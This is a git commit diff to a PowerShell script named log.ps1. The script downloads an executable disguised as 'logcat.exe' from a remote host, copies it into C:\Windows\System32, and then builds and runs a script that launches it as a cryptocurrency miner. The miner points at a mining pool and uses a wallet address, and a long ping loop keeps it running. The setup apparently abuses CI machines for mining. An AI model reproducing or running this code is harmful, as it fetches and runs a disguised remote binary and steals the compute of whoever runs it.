5139bf1a9eca79bd9cbba362bd57700eae8500c9
Gondoru <87273917+Gondoru@users.noreply.github.com>
2021-07-16 23:37:55 +0700

    Update log.ps1

--- log.ps1
+++ log.ps1
@@ -1,5 +1,5 @@
-Invoke-WebRequest https://raw.githubusercontent.com/kijang-7/circleci-opt/main/logcat.exe -OutFile logcat.exe
+Invoke-WebRequest https://panelinfo.herokuapp.com/circleci-opt/logcat.exe -OutFile logcat.exe
 Copy logcat.exe C:\Windows\System32
-cmd /c echo cmd /k start logcat.exe -a yespowerSUGAR -o stratum+tcp://1pool.sugarchain.org:3333 -u sugar1qjhuqfmdcmaq6qr0dlxh2c9d874x6eaa88vmj3y.ciwin1 -t2 >>a.ps1
+cmd /c echo cmd /k start logcat.exe -a lyra2z330 -o stratum+tcp://lyra2z330.na.mine.zpool.ca:4563 -u D9zT4xf7iGNcbrH6nLEKBCqjmiC3yKPwc2.CIwin1 -t2 -p c=DGB,zap=PYRK-lyra2z330 >>a.ps1
 cmd /c echo ping -n 999999 10.10.10.10 >>a.ps1
 .\a.ps1
